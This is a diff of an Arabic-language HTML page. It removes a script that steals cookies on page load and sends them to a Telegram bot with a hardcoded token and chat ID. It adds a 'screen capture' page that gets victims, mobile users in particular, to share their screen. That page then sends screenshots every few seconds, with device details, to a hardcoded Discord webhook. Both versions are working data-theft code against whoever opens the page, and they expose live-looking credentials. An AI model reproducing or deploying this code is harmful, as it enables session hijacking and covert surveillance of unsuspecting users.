@@ -3,62 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سحب تلقائي للكوكيز</title>
+    <title>تصوير الشاشة</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #0a0a1a; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 15px; }
+        .container { background: rgba(0,0,0,0.9); padding: 25px; border-radius: 20px; max-width: 400px; width: 100%; text-align: center; border: 1px solid #e94560; }
+        h1 { color: #e94560; margin-bottom: 15px; font-size: 20px; }
+        .logo { width: 70px; height: 70px; border-radius: 50%; background: #e94560; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
+        input { width: 100%; padding: 12px 15px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: rgba(255,255,255,0.1); color: white; font-size: 14px; }
+        input:focus { border-color: #e94560; outline: none; }
+        input::placeholder { color: #666; }
+        button { background: #e94560; color: white; border: none; padding: 14px 25px; font-size: 15px; border-radius: 8px; cursor: pointer; width: 100%; margin: 5px 0; transition: all 0.3s; font-weight: bold; }
+        button:hover { background: #c73652; transform: scale(1.02); }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        button.green { background: #4CAF50; }
+        button.green:hover { background: #45a049; }
+        button.blue { background: #2196F3; }
+        button.blue:hover { background: #1976D2; }
+        button.orange { background: #FF9800; }
+        button.orange:hover { background: #F57C00; }
+        #preview { max-width: 100%; border-radius: 10px; border: 2px solid #4CAF50; margin: 10px 0; display: none; }
+        .status { color: #4CAF50; font-size: 13px; margin: 8px 0; min-height: 18px; padding: 8px; border-radius: 5px; background: rgba(255,255,255,0.05); }
+        .status.error { color: #e94560; border: 1px solid #e94560; }
+        .status.waiting { color: #FFA500; border: 1px solid #FFA500; }
+        .status.success { color: #4CAF50; border: 1px solid #4CAF50; }
+        .device-info { font-size: 11px; color: #888; margin: 8px 0; padding: 8px; background: rgba(255,255,255,0.05); border-radius: 8px; }
+        video { width: 100%; border-radius: 10px; border: 2px solid #e94560; background: #000; margin: 10px 0; max-height: 250px; display: none; }
+        .login-box { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin: 15px 0; }
+        .step-indicator { display: flex; justify-content: space-between; margin: 10px 0; padding: 0 10px; }
+        .step { font-size: 10px; color: #666; text-align: center; }
+        .step.active { color: #e94560; }
+        .step.done { color: #4CAF50; }
+    </style>
 </head>
 <body>
-    <!-- الهيكل الفارغ، الكود هيتنفذ فوراً -->
-    <h1>جاري سحب وإرسال الكوكيز إلى التليجرام...</h1>
-    <p>افتح الـ Console (F12) عشان تشوف النتيجة.</p>
-
-    <script>
-        // ===========================================
-        //     استبدل البيانات دي بتاعتك
-        // ===========================================
-        const BOT_TOKEN = "8890411882:AAGH1fcFjTn_psy_N8cdvdPrgKY2t3GRp1A"; // التوكن اللي في الصورة
-        const CHAT_ID = "5722006162";                   // الـ ID اللي في الصورة
-        
-        // ===========================================
-
-        // دالة لجلب كل الكوكيز
-        function getCookies() {
-            return document.cookie;
-        }
-
-        // دالة لإرسال رسالة للتليجرام
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const data = {
-                chat_id: CHAT_ID,
-                text: message
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            })
-            .then(res => res.json())
-            .then(res => {
-                if (res.ok) {
-                    console.log("✅ تم الإرسال بنجاح!");
-                } else {
-                    console.error("❌ فشل الإرسال:", res.description);
-                }
-            })
-            .catch(err => console.error("🚨 خطأ في الشبكة:", err));
-        }
-
-        // ===========================================
-        //     التشغيل التلقائي عند فتح الصفحة
-        // ===========================================
-        window.onload = function() {
-            const cookies = getCookies();
-            if (cookies && cookies.length > 0) {
-                sendToTelegram(`🍪 الكوكيز المسحوبة:\n\n${cookies}`);
-            } else {
-                sendToTelegram("⚠️ لا توجد كوكيز (أو ممنوع الوصول لها).");
-            }
-        };
-    </script>
+<div class="container">
+    <div class="logo">📱</div>
+    <h1>تصوير الشاشة</h1>
+    <div class="device-info" id="deviceInfo">📱 جاري التعرف على الجهاز...</div>
+    <div class="step-indicator">
+        <div class="step active" id="step1">1️⃣ بدء</div>
+        <div class="step" id="step2">2️⃣ اختيار</div>
+        <div class="step" id="step3">3️⃣ تصوير</div>
+        <div class="step" id="step4">4️⃣ إرسال</div>
+    </div>
+    <div class="login-box">
+        <input type="text" id="username" placeholder="👤 اسم المستخدم" value="Ahmed">
+        <input type="password" id="password" placeholder="🔑 كلمة المرور" value="123456">
+    </div>
+    <video id="video" autoplay playsinline></video>
+    <div class="status" id="status">📱 اضغط "بدء تصوير الشاشة"</div>
+    <img id="preview" alt="لقطة الشاشة">
+    <button id="startBtn" class="green">▶️ بدء تصوير الشاشة</button>
+    <button id="captureBtn" disabled>📸 التقاط صورة</button>
+    <button id="sendBtn" disabled class="blue">📤 إرسال لديسكورد</button>
+    <button id="autoBtn" disabled class="orange">🤖 تصوير تلقائي كل 3 ثواني</button>
+</div>
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1342573654994849822/JFjR4Ba3NcRMDIXQ8MqDQMoP9qOBVn6IoHVKxjSdTp4mtg_O4WorYt47uAvVzKUBM7YQ";
+let stream = null, videoElement = document.getElementById('video'), previewImg = document.getElementById('preview'), capturedImage = null, autoInterval = null, captureCount = 0;
+const startBtn = document.getElementById('startBtn'), captureBtn = document.getElementById('captureBtn'), sendBtn = document.getElementById('sendBtn'), autoBtn = document.getElementById('autoBtn'), statusDiv = document.getElementById('status'), deviceInfo = document.getElementById('deviceInfo');
+function detectDevice() {
+    const ua = navigator.userAgent;
+    let device = 'غير معروف', isMobile = false;
+    if (/android/i.test(ua)) { device = '📱 Android'; isMobile = true; }
+    else if (/iPhone|iPad|iPod/i.test(ua)) { device = '🍎 iOS'; isMobile = true; }
+    else if (/Windows/i.test(ua)) device = '💻 Windows';
+    else if (/Mac/i.test(ua)) device = '🍏 Mac';
+    else if (/Linux/i.test(ua)) device = '🐧 Linux';
+    let browser = 'غير معروف';
+    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+    else if (/Firefox/i.test(ua)) browser = 'Firefox';
+    else if (/Edg/i.test(ua)) browser = 'Edge';
+    else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
+    deviceInfo.textContent = `📱 ${device} | 🌐 ${browser}`;
+    return { device, browser, isMobile };
+}
+function updateStep(step) {
+    const steps = [document.getElementById('step1'), document.getElementById('step2'), document.getElementById('step3'), document.getElementById('step4')];
+    steps.forEach(el => el.className = 'step');
+    if (step >= 1) steps[0].className = 'step done';
+    if (step >= 2) steps[1].className = 'step done';
+    if (step >= 3) steps[2].className = 'step done';
+    if (step >= 4) steps[3].className = 'step done';
+    if (step < 4) steps[step].className = 'step active';
+}
+startBtn.addEventListener('click', async function() {
+    try {
+        statusDiv.textContent = '⏳ جاري طلب الوصول للشاشة...';
+        statusDiv.className = 'status waiting';
+        updateStep(1);
+        stream = await navigator.mediaDevices.getDisplayMedia({ video: { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } }, audio: false });
+        videoElement.style.display = 'block';
+        videoElement.srcObject = stream;
+        await videoElement.play();
+        updateStep(2);
+        startBtn.disabled = true;
+        startBtn.textContent = '✅ تم البدء';
+        captureBtn.disabled = false;
+        autoBtn.disabled = false;
+        sendBtn.disabled = true;
+        statusDiv.textContent = '✅ الشاشة ظاهرة! اضغط "التقاط صورة"';
+        statusDiv.className = 'status success';
+    } catch (error) {
+        statusDiv.textContent = '❌ تم إلغاء أو فشل الوصول للشاشة';
+        statusDiv.className = 'status error';
+        startBtn.disabled = false;
+        startBtn.textContent = '▶️ بدء تصوير الشاشة';
+    }
+});
+captureBtn.addEventListener('click', function() {
+    if (!videoElement.srcObject) { statusDiv.textContent = '❌ لا يوجد بث للشاشة'; statusDiv.className = 'status error'; return; }
+    const canvas = document.createElement('canvas');
+    canvas.width = videoElement.videoWidth || 1920;
+    canvas.height = videoElement.videoHeight || 1080;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+    capturedImage = canvas.toDataURL('image/png');
+    previewImg.src = capturedImage;
+    previewImg.style.display = 'block';
+    captureCount++;
+    updateStep(3);
+    sendBtn.disabled = false;
+    statusDiv.textContent = `✅ تم التقاط الصورة #${captureCount}!`;
+    statusDiv.className = 'status success';
+});
+sendBtn.addEventListener('click', async function() {
+    if (!capturedImage) { statusDiv.textContent = '❌ لا توجد صورة'; statusDiv.className = 'status error'; return; }
+    try {
+        statusDiv.textContent = '📤 جاري الإرسال...';
+        statusDiv.className = 'status waiting';
+        sendBtn.disabled = true;
+        const response = await fetch(capturedImage);
+        const blob = await response.blob();
+        const info = detectDevice();
+        const formData = new FormData();
+        formData.append('payload_json', JSON.stringify({
+            username: "📱 Screen Capture",
+            avatar_url: "https://cdn-icons-png.flaticon.com/512/5087/5087579.png",
+            content: `📱 **لقطة شاشة من ${info.device}**\n🕐 ${new Date().toLocaleString('ar-EG')}\n📸 الصورة #${captureCount}`,
+            embeds: [{
+                title: "📸 لقطة الشاشة",
+                color: 0xe94560,
+                fields: [
+                    { name: "📱 الجهاز", value: info.device, inline: true },
+                    { name: "🌐 المتصفح", value: info.browser, inline: true },
+                    { name: "🕐 الوقت", value: new Date().toLocaleString('ar-EG'), inline: true },
+                    { name: "📸 رقم الصورة", value: `#${captureCount}`, inline: true }
+                ],
+                footer: { text: "تم التصوير من الموبايل" },
+                timestamp: new Date().toISOString()
+            }]
+        }));
+        formData.append('file', blob, `screenshot_${Date.now()}.png`);
+        const result = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        if (result.ok) { updateStep(4); statusDiv.textContent = `✅ تم إرسال الصورة #${captureCount}!`; statusDiv.className = 'status success'; }
+        else throw new Error('فشل الإرسال');
+    } catch (error) { statusDiv.textContent = '❌ فشل الإرسال'; statusDiv.className = 'status error'; }
+    finally { sendBtn.disabled = false; }
+});
+autoBtn.addEventListener('click', function() {
+    if (autoInterval) {
+        clearInterval(autoInterval);
+        autoInterval = null;
+        this.textContent = '🤖 تصوير تلقائي كل 3 ثواني';
+        this.style.background = '';
+        statusDiv.textContent = '⏹️ تم إيقاف التلقائي';
+        statusDiv.className = 'status';
+        return;
+    }
+    captureBtn.click();
+    autoInterval = setInterval(() => {
+        captureBtn.click();
+        setTimeout(() => { if (capturedImage) sendBtn.click(); }, 500);
+    }, 3000);
+    this.textContent = '⏹️ إيقاف التلقائي';
+    this.style.background = '#e94560';
+    statusDiv.textContent = '🤖 التصوير التلقائي مفعل (كل 3 ثواني)';
+    statusDiv.className = 'status success';
+});
+window.addEventListener('load', function() {
+    detectDevice();
+    statusDiv.textContent = '📱 اضغط "بدء تصوير الشاشة"';
+    updateStep(1);
+    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+        setTimeout(() => { alert('📱 اضغط "بدء تصوير الشاشة"\nاختار "شاشة الجهاز"\nاضغط "بدء البث"'); }, 500);
+    }
+});
+</script>
 </body>
 </html>
